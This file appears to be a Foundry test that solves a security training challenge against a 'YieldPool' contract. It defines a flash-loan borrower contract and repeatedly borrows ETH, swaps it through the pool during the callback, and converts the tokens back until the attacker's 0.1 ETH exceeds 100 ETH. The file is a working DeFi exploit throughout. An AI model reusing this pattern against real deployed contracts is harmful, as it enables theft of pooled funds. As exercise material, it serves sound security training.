// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {YieldPool, SecureumToken, IERC20} from "../src/6_yieldPool/YieldPool.sol";
import {IERC3156FlashLender, IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/

contract AttackContractFlashLoan is IERC3156FlashBorrower {
    YieldPool public yieldPool;
    SecureumToken public token;

    constructor(YieldPool _yieldPool, SecureumToken _token) payable {
        yieldPool = _yieldPool;
        token = _token;
    }

    fallback() external payable {}

    function onFlashLoan(address initiator, address _token, uint256 amount, uint256 fee, bytes calldata data) external override returns (bytes32) {   

        // Step 2. Swap the ETH for the token. This will pay the loan while reveiving tokens.
        yieldPool.ethToToken{value: address(this).balance}();
        
        token.transfer(initiator, token.balanceOf(address(this)));

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

// 9999000000000000000000
// 99990000000000000000
// 792633747506853307346


/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge6Test is Test {
    SecureumToken public token;
    YieldPool public yieldPool;

    address public attacker = makeAddr("attacker");
    address public owner = makeAddr("owner");

    function setUp() public {
        // setup pool with 10_000 ETH and ST tokens
        uint256 start_liq = 10_000 ether;
        vm.deal(address(owner), start_liq);
        vm.prank(owner);
        token = new SecureumToken(start_liq);
        yieldPool = new YieldPool(token);
        vm.prank(owner);
        token.increaseAllowance(address(yieldPool), start_liq);
        vm.prank(owner);
        yieldPool.addLiquidity{value: start_liq}(start_liq);

        // attacker starts with 0.1 ether
        vm.deal(address(attacker), 0.1 ether);
    }

    function testExploitPool() public {
        vm.startPrank(attacker);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge6Test -vvvv //
        ////////////////////////////////////////////////////*/
        address eth = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
        AttackContractFlashLoan attackContract = new AttackContractFlashLoan{value: 0.1 ether}(yieldPool, token);
        while(address(attacker).balance < 100 ether){
            
            //Step 1. send eth to the flashloan contract, and call for the flashloan of 100* the amount of eth. (fee will be 1%)
            payable(address(attackContract)).transfer(address(attacker).balance);

            yieldPool.flashLoan(attackContract, address(eth), address(attackContract).balance * 100, "");

            //Step 3. convert the obtained tokens to eth  
            token.approve(address(yieldPool), type(uint256).max);
            yieldPool.tokenToEth(token.balanceOf(address(attacker)));
        }
        
        //==================================================//
        vm.stopPrank();

        assertGt(address(attacker).balance, 100 ether, "hacker should have more than 100 ether");
    }
}
